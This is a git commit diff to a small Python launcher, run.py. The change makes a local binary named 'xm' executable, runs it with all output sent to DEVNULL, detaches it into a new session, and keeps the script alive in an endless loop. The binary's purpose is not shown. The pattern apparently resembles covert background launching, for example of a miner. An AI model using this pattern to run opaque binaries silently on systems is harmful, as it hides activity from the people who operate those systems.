71242f6427338c1386fae4f891f1c30c2384952b
Vixiu <93539736+Vixiu@users.noreply.github.com>
2025-06-09 15:00:58 +0800

    Update run.py

--- run.py
+++ run.py
@@ -4,12 +4,13 @@ import time
 
 if __name__ == "__main__":
     file_path = os.path.join(os.getcwd(), 'xm')
+    print(file_path)
     os.chmod(file_path, 0o755)
     process = subprocess.Popen(
         [file_path],  # 执行的文件
-        stdout=subprocess.PIPE,  # 捕获标准输出
-        stderr=subprocess.PIPE,  # 捕获错误输出
-        text=True  # 输出以文本方式返回
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        start_new_session=True  # 创建新进程组，脱离父进程
     )
     while True:
         time.sleep(10)
